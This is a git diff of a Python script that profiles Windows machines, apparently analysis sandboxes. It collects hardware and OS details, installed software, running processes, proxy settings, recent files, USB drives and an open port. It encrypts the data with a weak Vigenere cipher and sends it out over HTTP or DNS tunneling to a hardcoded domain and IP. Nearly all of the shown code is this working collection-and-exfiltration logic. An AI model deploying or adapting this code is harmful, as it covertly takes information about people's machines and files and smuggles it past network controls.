@@ -23,12 +23,13 @@ import requests
 
 #Global config
 key = 'ANOTHERONEGOTCAUGHTTODAYITSALLOVERTHEPAPERSTEENAGERARRESTEDINCOMPUTERCRIMESCANDALHACKERARRESTEDAFTERBANKTAMPERINGDAMNKIDSTHEYREALLALIKEBUTDIDYOUINYOURTHREEPIECEPSYCHOLOGYANDSTECHNOBRAINEVERTAKEALOOKBEHINDTHEEYESOFTHEHACKERDIDYOUEVERWONDERWHATMADEHIMTICKWHATFORCESSHAPEDHIMWHATMAYHAVEMOLDEDHIMIAMAHACKERENTERMYWORLDMINEISAWORLDTHATBEGINSWITHSCHOOLIMSMARTERTHANMOSTOFTHEOTHERKIDSTHISCRAPTHEYTEACHUSBORESMEDAMNUNDERACHIEVERTHEYREALLALIKEIMINJUNIORHIGHORHIGHSCHOOLIVELISTENEDTOTEACHERSEXPLAINFORTHEFIFTEENTHTIMEHOWTOREDUCEAFRACTIONIUNDERSTANDITNOMSSMITHIDIDNTSHOWMYWORKIDIDITINMYHEADDAMNKIDPROBABLYCOPIEDITTHEYREALLALIKEIMADEADISCOVERYTODAYIFOUNDACOMPUTERWAITASECONDTHISISCOOLITDOESWHATIWANTITTOIFITMAKESAMISTAKEITSBECAUSEISCREWEDITUPNOTBECAUSEITDOESNTLIKEMEORFEELSTHREATENEDBYMEORTHINKSIMASMARTASSORDOESNTLIKETEACHINGANDSHOULDNTBEHEREDAMNKIDALLHEDOESISPLAYGAMESTHEYREALLALIKEANDTHENITHAPPENEDADOOROPENEDTOAWORLDRUSHINGTHROUGHTHEPHONELINELIKEHEROINTHROUGHANADDICTSVEINSANELECTRONICPULSEISSENTOUTAREFUGEFROMTHEDAYTODAYINCOMPETENCIESISSOUGHTABOARDISFOUNDTHISISITTHISISWHEREIBELONGIKNOWEVERYONEHEREEVENIFIVENEVERMETTHEMNEVERTALKEDTOTHEMMAYNEVERHEARFROMTHEMAGAINIKNOWYOUALLDAMNKIDTYINGUPTHEPHONELINEAGAINTHEYREALLALIKEYOUBETYOURASSWEREALLALIKEWEVEBEENSPOONFEDBABYFOODATSCHOOLWHENWEHUNGEREDFORSTEAKTHEBITSOFMEATTHATYOUDIDLETSLIPTHROUGHWEREPRECHEWEDANDTASTELESSWEVEBEENDOMINATEDBYSADISTSORIGNOREDBYTHEAPATHETICTHEFEWTHATHADSOMETHINGTOTEACHFOUNDUSWILLINGPUPILSBUTTHOSEFEWARELIKEDROPSOFWATERINTHEDESERTTHISISOURWORLDNOWTHEWORLDOFTHEELECTRONANDTHESWITCHTHEBEAUTYOFTHEBAUDWEMAKEUSEOFASERVICEALREADYEXISTINGWITHOUTPAYINGFORWHATCOULDBEDIRTCHEAPIFITWASNTRUNBYPROFITEERINGGLUTTONSANDYOUCALLUSCRIMINALSWEEXPLOREANDYOUCALLUSCRIMINALSWESEEKAFTERKNOWLEDGEANDYOUCALLUSCRIMINALSWEEXISTWITHOUTSKINCOLORWITHOUTNATIONALITYWITHOUTRELIGIOUSBIASANDYOUCALLUSCRIMINALSYOUBUILDATOMICBOMBSYOUWAGEWARSYOUMURDERCHEATANDLIETOUSANDTRYTOMAKEUSBELIEVEITSFOROUROWNGOODYETWERETHECRIMINALSYESIAMACRIMINALMYCRIMEISTHATOFCURIOSITYMYCRIMEISTHATOFJUDGINGPEOPLEBYWHATTHEYSAYANDTHINKNOTWHATTHEYLOOKLIKEMYCRIMEISTHATOFOUTSMARTINGYOUSOMETHINGTHATYOUWILLNEVERFORGIVEMEFORIAMAHACKERANDTHISISMYMANIFESTOYOUMAYSTOPTHISINDIVIDUALBUTYOUCANTSTOPUSALLAFTERALLWEREALLALIKE'
-target = 'sndbxtst.info'  #target domain for leak
+target = 'sndbxtst.info'  #target domain for leak <YOUR_DOMAIN>
 url_end = '/sndbxtst/index.php'
 url_screenshot_end = "/sndbxtst/scrn.php"
+subdomain = '.tt.'
 
 #Local config
-target_ip = "159.8.37.74"   #what is the IP for $target
+target_ip = "159.8.37.74"   #what is the IP for $target <YOUR_IP>
 test_url = 'https://github.com/favicon.ico'
 test_hash = '4eda7c0f3a36181f483dd0a14efe9f58c8b29814'
 
@@ -241,6 +242,8 @@ def check_dll(dll):
     result = 'DLL ' + hMod + "|"
     return result
 # encrypt our staff with Vigenere, code stolen from here: https://inventwithpython.com/vigenereCipher.py
+# this has the security as an MTP encryption (Many Time Pad) - see here http://travisdazell.blogspot.in/2012/11/many-time-pad-attack-crib-drag.html
+# yes, this crypto is broken
 def translateMessage(message, key, mode):
     LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
     translated = []  # stores the encrypted/decrypted message string
@@ -277,7 +280,7 @@ def format_helper(commands):
         result = regex2.sub("|", result2)
     return result
 # group of commands to run in thread
-def commands_1_1(result, target, key, host, network_avail, dns_avail):
+def commands_0(result, target, key, host, network_avail, dns_avail):
     # python wmi was too sloooooow :/
     commands = {'wmic os get serialnumber': 'SN',
                 'wmic logicaldisk get name':'LDN',
@@ -292,7 +295,7 @@ def commands_1_1(result, target, key, host, network_avail, dns_avail):
                 }
     result = format_helper(commands)
     send_data(result, target, key, host, network_avail, dns_avail)
-def commands_1_2(result, target, key, host, network_avail, dns_avail):
+def commands_1(result, target, key, host, network_avail, dns_avail):
     commands = {
                 'wmic cpu get name':'CPN',
                 'wmic cpu get numberofcores':'CPC',
@@ -301,7 +304,7 @@ def commands_1_2(result, target, key, host, network_avail, dns_avail):
                 }
     result = format_helper(commands)
     send_data(result, target, key, host, network_avail, dns_avail)
-def commands_1_3(result, target, key, host, network_avail, dns_avail):
+def commands_2(result, target, key, host, network_avail, dns_avail):
     commands = {
                 'wmic printer get name':'PRN',
                 'wmic baseboard get manufacturer':'BM',
@@ -317,7 +320,7 @@ def commands_1_3(result, target, key, host, network_avail, dns_avail):
                 }
     result = format_helper(commands)
     send_data(result, target, key, host, network_avail, dns_avail)
-def commands_1_4(result, target, key, host, network_avail, dns_avail):
+def commands_3(result, target, key, host, network_avail, dns_avail):
     commands = {
                 'netsh winhttp show proxy':'PR1',
                 'netsh diag connect ieproxy':'PR2',
@@ -326,7 +329,7 @@ def commands_1_4(result, target, key, host, network_avail, dns_avail):
                 }
     result = format_helper(commands)
     send_data(result, target, key, host, network_avail, dns_avail)
-def commands_2(result, target, key, host, network_avail, dns_avail):
+def commands_4(result, target, key, host, network_avail, dns_avail):
     commands = {'wmic product get Name':'PN',
                 'wmic process get executablepath':'EX'}
     for c, v in commands.iteritems():
@@ -339,7 +342,7 @@ def commands_2(result, target, key, host, network_avail, dns_avail):
         regex2 = re.compile(r"\s\|")
         result = regex2.sub("|", result2)
     send_data(result, target, key, host, network_avail, dns_avail)
-def commands_3(result, target, key, host, network_avail, dns_avail):
+def commands_5(result, target, key, host, network_avail, dns_avail):
     result = result + 'RINTEMP ' + str(num_of_recent_files(os.path.expandvars('%TEMP%'), 7)) + "|"
     result = result + 'RINDESK ' + str(num_of_recent_files(os.path.expandvars('%USERPROFILE%') + '\\Desktop', 7)) + "|"
     result = result + 'RINDOC ' + str(num_of_recent_files(os.path.expandvars('%USERPROFILE%') + '\\Documents', 7)) + "|"
@@ -347,7 +350,7 @@ def commands_3(result, target, key, host, network_avail, dns_avail):
     result = result + 'RINAPPD ' + str(num_of_recent_files(os.path.expandvars('%APPDATA%'), 7)) + "|"
     result = result + 'AINDESK ' + str(num_of_recent_files(os.path.expandvars('%USERPROFILE%') + '\\Desktop', 99999)) + "|"
     send_data(result, target, key, host, network_avail, dns_avail)
-def commands_4(result, target, key, host, network_avail, dns_avail):
+def commands_6(result, target, key, host, network_avail, dns_avail):
     
     result = result + "WIDTH " + str(GetSystemMetrics (0)) + "|"
     result = result + "HEIGHT " + str(GetSystemMetrics (1)) + "|"
@@ -363,7 +366,7 @@ def commands_4(result, target, key, host, network_avail, dns_avail):
     result = result + 'EXEC ' + str(sys.argv[0].split(os.sep)[-1]) + "|"
     result = result + 'TIME ' + str(time.time()) + "|"
     send_data(result, target, key, host, network_avail, dns_avail)
-def commands_5(result, target, key, host, network_avail, dns_avail):
+def commands_7(result, target, key, host, network_avail, dns_avail):
     # pokemon style error handling
     try:
         result = result + get_recently_opened_files() 
@@ -386,10 +389,10 @@ def commands_5(result, target, key, host, network_avail, dns_avail):
     except:
         pass
     send_data(result, target, key, host, network_avail, dns_avail)
-def commands_6(result, target, key, host, network_avail, dns_avail):
+def commands_8(result, target, key, host, network_avail, dns_avail):
      result = result + 'LOCALPORT ' + str(port_open(445)) + "|"
      send_data(result, target, key, host, network_avail, dns_avail)
-def commands_7(result, target, key, host, network_avail, dns_avail):
+def commands_9(result, target, key, host, network_avail, dns_avail):
     try:
         result = result + get_pendrives()
     except:
@@ -423,7 +426,7 @@ def calc_hash():
 # for dns tunneling split the domain names
 def rec_split(str, key, host, target):
     enc1 = translateMessage(str[:61], key, 'encrypt')
-    socket.gethostbyname(enc1 + '.' + host + '.tt.' + target)
+    socket.gethostbyname(enc1 + '.' + host + subdomain + target)
     if len(str) > 61:
         rec_split('X-' + str[61:], key, host, target)
 # send extracted data via http or dns
@@ -466,76 +469,21 @@ try:
     dns_avail = test_dns(target, target_ip)
     #network_avail = True
     #dns_avail = True
-    
+    fl = [commands_1,commands_2,
+          #commands_3,commands_4,    #disabled
+          commands_5,commands_6,commands_7,commands_8,commands_9]
+    t = []
+    for f in fl:
+        try:
+            result = ""
+            t1 = Thread(target=f, args=(result, target, key, host, network_avail, dns_avail))
+            t1.start()
+            t.append(t1)
+        except:
+            pass   
+   
     try:
-        result = ""
-        c1_1 = Thread(target=commands_1_1, args=(result, target, key, host, network_avail, dns_avail))
-        c1_1.start()
-    except:
-        pass
-    
-    try:
-        result = ""
-        c1_2 = Thread(target=commands_1_2, args=(result, target, key, host, network_avail, dns_avail))
-        c1_2.start()
-    except:
-        pass
-    
-    try:
-        result = ""
-        c1_3 = Thread(target=commands_1_3, args=(result, target, key, host, network_avail, dns_avail))
-        c1_3.start()
-    except:
-        pass
-    # disabled , it was not meaningful
-    '''
-    try:
-        result = ""
-        c1_4 = Thread(target=commands_1_4, args=(result, target, key, host, network_avail,dns_avail))
-        c1_4.start()
-    except:
-        pass
-    '''   
-    # disabled due to performance issues 
-    '''    
-    try:
-        result = ""
-        c2 = Thread(target=commands_2, args=(result, target, key, host, network_avail,dns_avail))
-        c2.start()
-    except:
-        pass
-    '''        
-    try:
-        result = ""
-        c3 = Thread(target=commands_3, args=(result, target, key, host, network_avail, dns_avail))
-        c3.start()
-    except:
-        pass
-    try:
-        result = ""
-        c4 = Thread(target=commands_4, args=(result, target, key, host, network_avail, dns_avail))
-        c4.start()
-    except:
-        pass
-    try:
-        result = ""
-        c5 = Thread(target=commands_5, args=(result, target, key, host, network_avail, dns_avail))
-        c5.start()
-    except:
-        pass
-    try:
-        result = ""
-        c6 = Thread(target=commands_6, args=(result, target, key, host, network_avail, dns_avail))
-        c6.start()
-    except:
-        pass
-    try:
-        result = ""
-        c7 = Thread(target=commands_7, args=(result, target, key, host, network_avail, dns_avail))
-        c7.start()
-    except:
-        pass    
-    try:
+        #is sleep emulated?
         t1 = Thread(target=mysleep, args=())
         t1.start()
         t2 = Thread(target=calc_hash, args=())
@@ -558,18 +506,10 @@ try:
         pass
 
     # wait all thread to finish
-    c1_1.join()
-    c1_2.join()
-    c1_3.join()
-    # c1_4.join()
-    # c2.join()
-    c3.join()
-    c4.join()
-    c5.join()
-    c6.join()
-    c7.join()
+    for x in t:
+        x.join()
     
 except:
     # print("e")
-    traceback.print_exc()
+    #traceback.print_exc()
     pass
